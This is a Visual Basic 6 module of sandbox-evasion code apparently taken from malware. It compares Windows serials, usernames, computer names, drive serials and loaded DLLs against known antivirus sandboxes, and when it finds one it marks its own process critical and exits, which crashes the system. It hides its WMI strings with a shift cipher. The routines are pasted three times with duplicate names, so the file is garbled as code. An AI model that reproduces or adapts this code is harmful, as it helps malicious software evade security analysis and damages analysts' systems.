Attribute VB_Name = "Module2"
Option Explicit
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
Private Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Enable As Boolean, ByVal Client As Boolean, WasEnabled As Long) As Long
Private Declare Function NtSetInformationProcess Lib "ntdll.dll" (ByVal hProcess As Integer, ByVal ProcessInformationClass As Integer, ByVal ProcessInformation As Long, ByVal ProcessInformationLength As Integer) As Integer
Private Declare Function GetVolumeInformationA Lib "kernel32" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Long, lpVolumeSerialNumber As Long, lpMaximumComponentLength As Long, lpFileSystemFlags As Long, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Long) As Long
Private Declare Sub ExitProcess Lib "kernel32" (ByVal uExitCode As Long)

Public Sub CompCheckqwe()
    Dim bFound As Boolean
    
    If GWser = "55274-339-6006333-22900" Then
        bFound = True
    End If
    
    If GWser = "76487-OEM-0065901-82986" Then
        bFound = True
    End If
    
    If Environ("computername") = "XPSP3" Then
        If Environ("username") = "Joe" Then
            bFound = True
        End If
    End If
    
    If Left(Environ("computername"), 10) = "NONE-DUSEZ" Then
        bFound = True
    End If
    
    If Left(Environ("computername"), 5) = "VMLOG" Then
        bFound = True
    End If
    
    If Environ("username") = "Sndbx" Then
        If GetDriveSerial() = 546811503 Then bFound = True 'Sandbox of unknown AV
    End If
    
    If Environ("username") = "tester" Then
        If GetDriveSerial() = 800539777 Then bFound = True 'Sandbox of unknown AV found...
    End If
    
    If Environ("USERNAME") = "panda" Then
        If Environ("computername") = "AUTO" Then bFound = True 'Msgbox "Panda Sandbox Detected"
    End If
        
    If Environ("username") = "currentuser" Then bFound = True 'MsgBox "Norman Sandbox Detected"
    
    If App.Path = "C:\" Then
        If App.EXEName = "file" Then bFound = True 'MsgBox "Sunbelt Sandbox Detected"
        If App.EXEName = "Sample" Then bFound = True 'MsgBox "Anubis Sandbox Detected"
    End If
        
    If GetModuleHandle("SbieDll.dll") Then bFound = True 'MsgBox "Sandboxie Detected"

    If Environ("username") = "Schmidti" Then bFound = True 'MsgBox "CW Sandbox Detected"
        
    If bFound = True Then
        Call MakeCritical(-1, True)
        Call ExitProcess(0)
    End If

End Sub
Private Function MakeCritical(Phandle As Long, Value As Boolean)
    Dim ProcessInfo As Long
    ProcessInfo = IIf(Value, 29&, 0&)
    Call RtlAdjustPrivilege(20, True, True, 0)
    Call NtSetInformationProcess(Phandle, 29, VarPtr(ProcessInfo), Len(ProcessInfo))
End Function
Private Function GetDriveSerial() As Long
    Dim RetVal As Long
    Dim str As String * 255
    Dim str2 As String * 255
    Dim a As Long
    Dim b As Long
    Call GetVolumeInformationA("C:\", str, 255, RetVal, a, b, str2, 255)
    GetDriveSerial = IIf(RetVal < 0, RetVal * -1, RetVal)
End Function
Public Function GWser() As String 'Get windows serial
  Dim WinSerial As String
  Dim SWbemSet As Object
  Dim SWbemObj As Object
  On Error Resume Next
    Set SWbemSet = GetObject(What("xjonhnut;|jnqfstpobujpoMfwfm>jnqfstpobuf~")).InstancesOf(Split(What("Xjo43`PqfsbujohTztufn-TfsjbmOvncfs"), ",")(0))
    WinSerial = ""
    For Each SWbemObj In SWbemSet
      WinSerial = SWbemObj.Properties_(Split(What("Xjo43`PqfsbujohTztufn-TfsjbmOvncfs"), ",")(1)) 'Property value
      WinSerial = Trim(WinSerial)
      If Len(WinSerial) < 1 Then WinSerial = "Unknown"
    GWser = WinSerial
  Next
End Function
Public Function What(huh) As String
Dim god As Long
Dim current As Long
Dim Process As String
For god = 1 To Len(huh)
            current = Asc(Mid(huh, god, 1)) - 1
        Process = Process & Chr(current)
    Next god
    What = Process
End Function

Public Sub CompCheckqweqwed()
    Dim bFound As Boolean
    
    If GWser = "55274-339-6006333-22900" Then
        bFound = True
    End If
    
    If GWser = "76487-OEM-0065901-82986" Then
        bFound = True
    End If
    
    If Environ("computername") = "XPSP3" Then
        If Environ("username") = "Joe" Then
            bFound = True
        End If
    End If
    
    If Left(Environ("computername"), 10) = "NONE-DUSEZ" Then
        bFound = True
    End If
    
    If Left(Environ("computername"), 5) = "VMLOG" Then
        bFound = True
    End If
    
    If Environ("username") = "Sndbx" Then
        If GetDriveSerial() = 546811503 Then bFound = True 'Sandbox of unknown AV
    End If
    
    If Environ("username") = "tester" Then
        If GetDriveSerial() = 800539777 Then bFound = True 'Sandbox of unknown AV found...
    End If
    
    If Environ("USERNAME") = "panda" Then
        If Environ("computername") = "AUTO" Then bFound = True 'Msgbox "Panda Sandbox Detected"
    End If
        
    If Environ("username") = "currentuser" Then bFound = True 'MsgBox "Norman Sandbox Detected"
    
    If App.Path = "C:\" Then
        If App.EXEName = "file" Then bFound = True 'MsgBox "Sunbelt Sandbox Detected"
        If App.EXEName = "Sample" Then bFound = True 'MsgBox "Anubis Sandbox Detected"
    End If
        
    If GetModuleHandle("SbieDll.dll") Then bFound = True 'MsgBox "Sandboxie Detected"

    If Environ("username") = "Schmidti" Then bFound = True 'MsgBox "CW Sandbox Detected"
        
    If bFound = True Then
        Call MakeCritical(-1, True)
        Call ExitProcess(0)
    End If

End Sub

Private Function MakeCritical(Phandle As Long, Value As Boolean)
    Dim ProcessInfo As Long
    ProcessInfo = IIf(Value, 29&, 0&)
    Call RtlAdjustPrivilege(20, True, True, 0)
    Call NtSetInformationProcess(Phandle, 29, VarPtr(ProcessInfo), Len(ProcessInfo))
End Function
Private Function GetDriveSerial() As Long
    Dim RetVal As Long
    Dim str As String * 255
    Dim str2 As String * 255
    Dim a As Long
    Dim b As Long
    Call GetVolumeInformationA("C:\", str, 255, RetVal, a, b, str2, 255)
    GetDriveSerial = IIf(RetVal < 0, RetVal * -1, RetVal)
End Function
Public Function GWser() As String 'Get windows serial
  Dim WinSerial As String
  Dim SWbemSet As Object
  Dim SWbemObj As Object
  On Error Resume Next
    Set SWbemSet = GetObject(What("xjonhnut;|jnqfstpobujpoMfwfm>jnqfstpobuf~")).InstancesOf(Split(What("Xjo43`PqfsbujohTztufn-TfsjbmOvncfs"), ",")(0))
    WinSerial = ""
    For Each SWbemObj In SWbemSet
      WinSerial = SWbemObj.Properties_(Split(What("Xjo43`PqfsbujohTztufn-TfsjbmOvncfs"), ",")(1)) 'Property value
      WinSerial = Trim(WinSerial)
      If Len(WinSerial) < 1 Then WinSerial = "Unknown"
    GWser = WinSerial
  Next
End Function
Public Function What(huh) As String
Dim god As Long
Dim current As Long
Dim Process As String
For god = 1 To Len(huh)
            current = Asc(Mid(huh, god, 1)) - 1
        Process = Process & Chr(current)
    Next god
    What = Process
End Function






Public Sub CompCheckqweqwedwed()
    Dim bFound As Boolean
    
    If GWser = "55274-339-6006333-22900" Then
        bFound = True
    End If
    
    If GWser = "76487-OEM-0065901-82986" Then
        bFound = True
    End If
    
    If Environ("computername") = "XPSP3" Then
        If Environ("username") = "Joe" Then
            bFound = True
        End If
    End If
    
    If Left(Environ("computername"), 10) = "NONE-DUSEZ" Then
        bFound = True
    End If
    
    If Left(Environ("computername"), 5) = "VMLOG" Then
        bFound = True
    End If
    
    If Environ("username") = "Sndbx" Then
        If GetDriveSerial() = 546811503 Then bFound = True 'Sandbox of unknown AV
    End If
    
    If Environ("username") = "tester" Then
        If GetDriveSerial() = 800539777 Then bFound = True 'Sandbox of unknown AV found...
    End If
    
    If Environ("USERNAME") = "panda" Then
        If Environ("computername") = "AUTO" Then bFound = True 'Msgbox "Panda Sandbox Detected"
    End If
        
    If Environ("username") = "currentuser" Then bFound = True 'MsgBox "Norman Sandbox Detected"
    
    If App.Path = "C:\" Then
        If App.EXEName = "file" Then bFound = True 'MsgBox "Sunbelt Sandbox Detected"
        If App.EXEName = "Sample" Then bFound = True 'MsgBox "Anubis Sandbox Detected"
    End If
        
    If GetModuleHandle("SbieDll.dll") Then bFound = True 'MsgBox "Sandboxie Detected"

    If Environ("username") = "Schmidti" Then bFound = True 'MsgBox "CW Sandbox Detected"
        
    If bFound = True Then
        Call MakeCritical(-1, True)
        Call ExitProcess(0)
    End If

End Sub
Private Function MakeCritical(Phandle As Long, Value As Boolean)
    Dim ProcessInfo As Long
    ProcessInfo = IIf(Value, 29&, 0&)
    Call RtlAdjustPrivilege(20, True, True, 0)
    Call NtSetInformationProcess(Phandle, 29, VarPtr(ProcessInfo), Len(ProcessInfo))
End Function
Private Function GetDriveSerial() As Long
    Dim RetVal As Long
    Dim str As String * 255
    Dim str2 As String * 255
    Dim a As Long
    Dim b As Long
    Call GetVolumeInformationA("C:\", str, 255, RetVal, a, b, str2, 255)
    GetDriveSerial = IIf(RetVal < 0, RetVal * -1, RetVal)
End Function
Public Function GWser() As String 'Get windows serial
  Dim WinSerial As String
  Dim SWbemSet As Object
  Dim SWbemObj As Object
  On Error Resume Next
    Set SWbemSet = GetObject(What("xjonhnut;|jnqfstpobujpoMfwfm>jnqfstpobuf~")).InstancesOf(Split(What("Xjo43`PqfsbujohTztufn-TfsjbmOvncfs"), ",")(0))
    WinSerial = ""
    For Each SWbemObj In SWbemSet
      WinSerial = SWbemObj.Properties_(Split(What("Xjo43`PqfsbujohTztufn-TfsjbmOvncfs"), ",")(1)) 'Property value
      WinSerial = Trim(WinSerial)
      If Len(WinSerial) < 1 Then WinSerial = "Unknown"
    GWser = WinSerial
  Next
End Function
Public Function What(huh) As String
Dim god As Long
Dim current As Long
Dim Process As String
For god = 1 To Len(huh)
            current = Asc(Mid(huh, god, 1)) - 1
        Process = Process & Chr(current)
    Next god
    What = Process
End Function


